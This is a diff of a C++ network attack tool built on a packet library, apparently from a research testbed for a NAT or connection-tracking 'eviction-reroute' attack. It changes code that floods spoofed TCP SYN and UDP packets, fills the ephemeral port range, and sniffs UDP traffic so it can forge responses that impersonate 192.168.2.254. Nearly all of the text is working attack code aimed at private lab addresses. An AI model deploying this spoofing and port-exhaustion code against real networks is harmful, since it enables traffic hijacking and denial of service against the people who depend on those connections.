@@ -22,8 +22,8 @@ string iface;
 string attacker_priv_ip = "10.8.0.10";
 
 #define PORT_RANGE_START 32768
-// #define PORT_RANGE_END  38000
-#define PORT_RANGE_END  61000
+#define PORT_RANGE_END  38000
+// #define PORT_RANGE_END  61000
 void tcp_attack_packets_fn() {
 
 	/*Send a bunch of TCP SYN's from attacker*/
@@ -211,7 +211,7 @@ void udp_attack_packets_fn() {
 	PacketSender sender;
 	NetworkInterface iface("enp0s8");
 
-	IP pkt = IP("192.168.3.131", attacker_priv_ip) / UDP(PORT_RANGE_START, 53) / RawPDU("0xdeadbeef1");
+	IP pkt = IP("192.168.3.131", attacker_priv_ip) / UDP(PORT_RANGE_START, 53);
 	IP& ip = pkt.rfind_pdu<IP>();
 	UDP& udp = pkt.rfind_pdu<UDP>();
 	while (true) {
@@ -234,11 +234,11 @@ void udp_fill_ephemeral_port_range() {
 	PacketSender sender;
 	NetworkInterface iface("enp0s8");
 
-	IP pkt = IP("192.168.3.13", attacker_priv_ip) / UDP(PORT_RANGE_START, PORT_RANGE_START)/RawPDU("0xdeadbeef1");
+	IP pkt = IP("192.168.3.13", attacker_priv_ip) / UDP(PORT_RANGE_START, PORT_RANGE_START);
 	IP& ip = pkt.rfind_pdu<IP>();
 	ip.ttl(2);
 	UDP& udp = pkt.rfind_pdu<UDP>();
-	IP atk_pkt = IP("192.168.3.13", attacker_priv_ip) / UDP(PORT_RANGE_START, 53)/RawPDU("0xdeadbeef1");
+	IP atk_pkt = IP("192.168.3.13", attacker_priv_ip) / UDP(PORT_RANGE_START, 53);
 	IP& atk_ip = atk_pkt.rfind_pdu<IP>();
 	atk_ip.ttl(2);
 	UDP& atk_udp = atk_pkt.rfind_pdu<UDP>();
@@ -272,27 +272,40 @@ bool _sniff_udp_response_target_handler(PDU &some_pdu) {
 	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
 	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
 	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
-	if ((ip_resp.src_addr() == "192.168.3.13" 
-				|| ip_resp.src_addr() == "192.168.3.14"
-				|| ip_resp.src_addr() == "192.168.3.15"
-				|| ip_resp.src_addr() == "192.168.3.16"
-				|| ip_resp.src_addr() == "192.168.3.17"
-				|| ip_resp.src_addr() == "192.168.3.18"
-				|| ip_resp.src_addr() == "192.168.3.19"
-				|| ip_resp.src_addr() == "192.168.3.20"
-				|| ip_resp.src_addr() == "192.168.3.21"
-				|| ip_resp.src_addr() == "192.168.3.22"
-				|| ip_resp.src_addr() == "192.168.3.23"
-				|| ip_resp.src_addr() == "192.168.3.24")
+	if (ip_resp.src_addr() == "192.168.2.254"
+		       	&& (ip_resp.dst_addr() == "192.168.3.13" 
+				|| ip_resp.dst_addr() == "192.168.3.14"
+				|| ip_resp.dst_addr() == "192.168.3.15"
+				|| ip_resp.dst_addr() == "192.168.3.16"
+				|| ip_resp.dst_addr() == "192.168.3.17"
+				|| ip_resp.dst_addr() == "192.168.3.18"
+				|| ip_resp.dst_addr() == "192.168.3.19"
+				|| ip_resp.dst_addr() == "192.168.3.20"
+				|| ip_resp.dst_addr() == "192.168.3.21"
+				|| ip_resp.dst_addr() == "192.168.3.22"
+				|| ip_resp.dst_addr() == "192.168.3.23"
+				|| ip_resp.dst_addr() == "192.168.3.24")
 		       	&& ip_resp.protocol() == IPPROTO_UDP) {
+		// const RawPDU &pl_resp = some_pdu.rfind_pdu<RawPDU>();
 
-		UDP& udp_resp = some_pdu.rfind_pdu<UDP>();
-		unsigned short sport = udp_resp.sport();
-		unsigned short dport = udp_resp.dport();
-		IP pkt = IP(ip_resp.src_addr(), ip_resp.dst_addr()) / UDP(sport, dport)/RawPDU("0xdeadbeef1");
-		IP& ip = pkt.rfind_pdu<IP>();
-		ip.ttl(4);
-		sender.send(pkt);
+		/*
+		if (pl_resp.payload_size() == sizeof("0xdeadbeef")) {
+			std::cout << "FOOO BAR!!!!" << std::endl;
+		}
+		*
+		*/
+	        if (ip_resp.tot_len() == 39) {	
+
+			UDP& udp_resp = some_pdu.rfind_pdu<UDP>();
+			unsigned short sport = udp_resp.sport();
+			unsigned short dport = udp_resp.dport();
+			IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / UDP(sport, dport)/RawPDU("0xdeadbeef");
+			IP& ip = pkt.rfind_pdu<IP>();
+			ip.ttl(4);
+			sender.send(pkt);
+		} else {
+			std::cout << "payload_size = " << ip_resp.tot_len() << std::endl;
+		}
 	}
 	return true;
 }
@@ -313,7 +326,7 @@ int main(int argc, char** argv) {
 	iface = argv[1];
 	std::cout << "eviction-reroute: iface=" << iface << std::endl;
 	bool do_tcp = false;
-	bool do_attacker = true;
+	bool do_attacker = false;
 	if (do_tcp) {
 		std::cout << "eviction-reroute: if do_tcp" << std::endl;
 		if (do_attacker) {// ATTACKER code
